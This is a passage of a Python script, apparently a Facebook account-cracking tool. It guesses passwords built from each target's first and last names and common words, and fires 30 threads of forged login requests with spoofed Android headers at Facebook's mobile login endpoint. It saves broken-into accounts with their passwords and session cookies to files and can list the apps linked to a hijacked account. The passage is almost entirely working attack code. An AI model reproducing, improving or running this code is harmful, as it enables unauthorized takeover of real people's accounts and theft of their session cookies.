			elif mtd in ["3","03"]:
				rlist.append('first6')
				rlist.append('first7')
				rlist.append('first8')
				rlist.append('number')
				rlist.append('last8')
				rlist.append('last7')
				rlist.append('last6')
				rlist.append('magar123')
				rlist.append('kathmandu')
				rlist.append('pokhara')
				rlist.append('dinesh')
				rlist.append('Kathmandu1234')
				rlist.append('nepal123')
				rlist.append('maya123')
				rlist.append('nepal1234')
				rlist.append('maya123')
				rlist.append('tamang')
			elif mtd in ["4","04"]:
				rlist.append('first6')
				rlist.append('first7')
				rlist.append('first8')
				rlist.append('number')
				rlist.append('last8')
				rlist.append('last9')
				rlist.append('last7')
				rlist.append('last6')
				rlist.append('Hama')
				rlist.append('Kurdistan')
			else:
				rlist.append('first6')
				rlist.append('first7')
				rlist.append('first8')
				rlist.append('number')
				rlist.append('last8')
				rlist.append('last7')
				rlist.append('last6')
			with tred(max_workers=30) as sendxd:
				banner()
				os.system("clear");banner();print(f'{N}{dot}Random ids{RED} : {H}'+str(len(id)));print(f'{N}{dot}Method opt{RED} : {H}'+hxc);print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}');print(led)
				for kingxpro in id:
					idf,names = kingxpro.split('|')
					pwv = rlist
					if 'm1' in method:sendxd.submit(rdm1,idf,pwv,names)
					elif 'm2' in method:sendxd.submit(rdm2,idf,pwv,names)
					elif 'm3' in method:sendxd.submit(rdm3,idf,pwv,names)
					else:sendxd.submit(rdm4,idf,pwv,names)
			print('');print(f'{gen}Hi Dear User Crack process has been completed');print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ');exit()
		else:banner();print(f'{rgen}Hello Brother something wrong');exit()
	except IOError:
		print(led);print(f"{dot}Something Wrong...")
		exit()
ses=requests.Session()
def application_check(ses,kuki):
	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'{dot}Active Apps {O}&&{P} Web site Status not Connected')
	else:
		print(f'{gen}{O}Active Apps {O}&&{O} Web site Status')
		for i in range(len(game)):
			print(f"{gen}{K}[{H}%s%s{K}] {GREEN}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'{rgen}{B}Expired Apps {B}&&{N} Web site Status not Connected')
	else:
		print(f'{dot}{P}Expired Apps {B}&&{P} Web site Status')
		for i in range(len(game)):
			print(f"{rgen}{K}[{B}%s%s{K}]{B} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
#Method for file clone
def filem1(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M1","\x1b[1;92mKING-M1","\x1b[1;93mKING-M1","\x1b[1;94mKING-M1","\x1b[1;95mKING-M1","\x1b[1;96mKING-M1","\x1b[1;97mKING-M1","\x1b[1;91mKING-M1","\x1b[1;92mKING-M1","\x1b[1;93mKING-M1","\x1b[1;94mKING-M1","\x1b[1;95mKING-M1","\x1b[1;96mKING-M1"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)))
	fn = names.split(' ')[0]
	try:
		ln = names.split(' ')[1]
	except:
		ln = fn
	try:
		for pow in pwv:
			pw = pow.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			link = ses.get("https://m.facebook.com/login/")
			pwd = f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"
			adid = str(uuid.uuid4())
			ust = unoxd()
			modelx = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
			andr = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			date = {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': rc(["b","k","g","s","j","w","u","x","l","e","f","y","h","a","t","m","d","p","r","q","c","i","n","z","o","v"]),
    '__hs': '20138.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '3',
    '__ccg': 'EXCELLENT',
    '__rev': '1020214944',
    '__s': 'mqm1s6:y0gn43:ms5sz4',
    '__hsi': '7473101451455039344',
    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
    '__csr': '',
    'fb_dtsg': 'NAcPOv1PcO7yr2jtWctjcqRGEEDI6ZRHvped9iZRhfMFLuZ6KtK7VvA:0:0',
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"vfu9sc:68\\",\\"password_text_input_id\\":\\"vfu9sc:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"190105806000356\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+adid+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+idf+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}'}
			cookies = {
    'datr': 'WPENZ9I1KcpTCNN8aOjFMWFQ',
    'sb': 'WPENZ3_RYTLChFlHevJYnA6T',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '3.2983407974243164',
    'm_pixel_ratio': '3',
    'wd': '360x710',
    'fr': '0BLMFvZvYneKc7x6T..Bnpnqx..AAA.0.0.BntcpB.AWUo5tA67b0'}
			head = {
    'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'datr=WPENZ9I1KcpTCNN8aOjFMWFQ; sb=WPENZ3_RYTLChFlHevJYnA6T; ps_l=1; ps_n=1; dpr=3.2983407974243164; m_pixel_ratio=3; wd=360x710; fr=0BLMFvZvYneKc7x6T..Bnpnqx..AAA.0.0.BntcpB.AWUo5tA67b0',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"{modelx}"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{andr}"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': f'{rc(["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", ust])}'}
			mahin_back = ses.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a",headers=head, data=date, cookies=cookies)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if 'Gmail' in gxmxl:
					match = re.search(r'c_user=([^;]+)', kuki)
					idf = match.group(1) if match else None
					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
						fo = f.read()
					if idf in fo:
						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						ok+=1
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
						
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
					break
				else:
					ok+=1
					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					
					if 'y' in cokix:
						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
					if 'y' in apxx:
						application_check(ses,kuki)
					break
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
#File M2 Method
def filem2(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M2","\x1b[1;92mKING-M2","\x1b[1;93mKING-M2","\x1b[1;94mKING-M2","\x1b[1;95mKING-M2","\x1b[1;96mKING-M2","\x1b[1;97mKING-M2","\x1b[1;91mKING-M2","\x1b[1;92mKING-M2","\x1b[1;93mKING-M2","\x1b[1;94mKING-M2","\x1b[1;95mKING-M2","\x1b[1;96mKING-M2"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	fn = names.split(' ')[0]
	try:
		ln = names.split(' ')[1]
	except:
		ln = fn
	try:
		for pow in pwv:
			pw = pow.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			link = ses.get("https://m.facebook.com/login/")
			pwd = f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"
			adid = str(uuid.uuid4())
			ust = unoxd()
			modelx = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
			andr = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			date = {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': rc(["b","k","g","s","j","w","u","x","l","e","f","y","h","a","t","m","d","p","r","q","c","i","n","z","o","v"]),
    '__hs': '20138.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '3',
    '__ccg': 'EXCELLENT',
    '__rev': '1020214944',
    '__s': 'mqm1s6:y0gn43:ms5sz4',
    '__hsi': '7473101451455039344',
    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
    '__csr': '',
    'fb_dtsg': 'NAcPOv1PcO7yr2jtWctjcqRGEEDI6ZRHvped9iZRhfMFLuZ6KtK7VvA:0:0',
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"vfu9sc:68\\",\\"password_text_input_id\\":\\"vfu9sc:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"190105806000356\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+adid+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+idf+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}'}
			cookies = {
    'datr': 'WPENZ9I1KcpTCNN8aOjFMWFQ',
    'sb': 'WPENZ3_RYTLChFlHevJYnA6T',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '3.2983407974243164',
    'm_pixel_ratio': '3',
    'wd': '360x710',
    'fr': '0BLMFvZvYneKc7x6T..Bnpnqx..AAA.0.0.BntcpB.AWUo5tA67b0'}
			head = {
    'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'datr=WPENZ9I1KcpTCNN8aOjFMWFQ; sb=WPENZ3_RYTLChFlHevJYnA6T; ps_l=1; ps_n=1; dpr=3.2983407974243164; m_pixel_ratio=3; wd=360x710; fr=0BLMFvZvYneKc7x6T..Bnpnqx..AAA.0.0.BntcpB.AWUo5tA67b0',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"{modelx}"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{andr}"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': ust}
			mahin_back = ses.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a",headers=head, data=date, cookies=cookies)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if 'Gmail' in gxmxl:
					match = re.search(r'c_user=([^;]+)', kuki)
					idf = match.group(1) if match else None
					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
						fo = f.read()
					if idf in fo:
						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						ok+=1
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
						
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
					break
				else:
					ok+=1
					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					
					if 'y' in cokix:
						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
					if 'y' in apxx:
						application_check(ses,kuki)
					break
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
#Method 3 For file clone
def filem3(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M3","\x1b[1;92mKING-M3","\x1b[1;93mKING-M3","\x1b[1;94mKING-M3","\x1b[1;95mKING-M3","\x1b[1;96mKING-M3","\x1b[1;97mKING-M3","\x1b[1;91mKING-M3","\x1b[1;92mKING-M3","\x1b[1;93mKING-M3","\x1b[1;94mKING-M3","\x1b[1;95mKING-M3","\x1b[1;96mKING-M3"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	fn = names.split(' ')[0]
	try:
		ln = names.split(' ')[1]
	except:
		ln = fn
	try:
		for pow in pwv:
			pw = pow.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			link = ses.get("https://m.facebook.com/login/")
			pwd = f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"
			adid = str(uuid.uuid4())
			ust = unoxd()
			modelx = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
			andr = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			date = {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': rc(["b","k","g","s","j","w","u","x","l","e","f","y","h","a","t","m","d","p","r","q","c","i","n","z","o","v"]),
    '__hs': '20135.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '1',
    '__ccg': 'EXCELLENT',
    '__rev': '1020155676',
    '__s': 'timdlg:qn4494:16ybr6',
    '__hsi': '7471908770505157669',
    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
    '__csr': '',
    'fb_dtsg': 'NAcNS73agICQMvkg__aPN7WtpkP_Ai3lBqzsizF6Ef56qm4kXM6e8-Q:0:0',
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"a3wxbs:68\\",\\"password_text_input_id\\":\\"a3wxbs:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"61123679200409\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+adid+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"F2_FLOW\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+idf+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}'}
			cookies = {
    'datr': 'IU6wZ_N1SNDxz9TvbprJXpmB',
    'sb': 'IU6wZ8g2vZTr32j8kUcvXOai',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '2.3369150161743164',
    'm_pixel_ratio': '2.125537157058716',
    'wd': '508x1009',
    'fr': '0tvhzqdRTxem3G3mB.AWXXMeL5ARKAhTPeUU27obkZe1yUaHWFS3hkLg.BnsE4h..AAA.0.0.BnsY2P.AWURWEQ7TZk'}
			head = {
    'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'datr=IU6wZ_N1SNDxz9TvbprJXpmB; sb=IU6wZ8g2vZTr32j8kUcvXOai; ps_l=1; ps_n=1; dpr=2.3369150161743164; m_pixel_ratio=2.125537157058716; wd=508x1009; fr=0tvhzqdRTxem3G3mB.AWXXMeL5ARKAhTPeUU27obkZe1yUaHWFS3hkLg.BnsE4h..AAA.0.0.BnsY2P.AWURWEQ7TZk',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"{modelx}"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{andr}"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': ust}
			mahin_back = ses.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a",headers=head, data=date, cookies=cookies)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if 'Gmail' in gxmxl:
					match = re.search(r'c_user=([^;]+)', kuki)
					idf = match.group(1) if match else None
					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
						fo = f.read()
					if idf in fo:
						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						ok+=1
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
						
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
					break
				else:
					ok+=1
					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					
					if 'y' in cokix:
						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
					if 'y' in apxx:
						application_check(ses,kuki)
					break
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
#method for File M4
def filem4(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M4","\x1b[1;92mKING-M4","\x1b[1;93mKING-M4","\x1b[1;94mKING-M4","\x1b[1;95mKING-M4","\x1b[1;96mKING-M4","\x1b[1;97mKING-M4","\x1b[1;91mKING-M4","\x1b[1;92mKING-M4","\x1b[1;93mKING-M4","\x1b[1;94mKING-M4","\x1b[1;95mKING-M4","\x1b[1;96mKING-M4"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	fn = names.split(' ')[0]
	try:
		ln = names.split(' ')[1]
	except:
		ln = fn
	try:
		for pow in pwv:
			pw = pow.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			link = ses.get("https://m.facebook.com/login/")
			pwd = f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"
			adid = str(uuid.uuid4())
			ust = unoxd()
			modelx = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
			andr = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			date = {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': rc(["b","k","g","s","j","w","u","x","l","e","f","y","h","a","t","m","d","p","r","q","c","i","n","z","o","v"]),
    '__hs': '20135.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '1',
    '__ccg': 'EXCELLENT',
    '__rev': '1020155676',
    '__s': 'timdlg:qn4494:16ybr6',
    '__hsi': '7471908770505157669',
    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
    '__csr': '',
    'fb_dtsg': 'NAcNS73agICQMvkg__aPN7WtpkP_Ai3lBqzsizF6Ef56qm4kXM6e8-Q:0:0',
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"a3wxbs:68\\",\\"password_text_input_id\\":\\"a3wxbs:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"61123679200409\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+adid+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\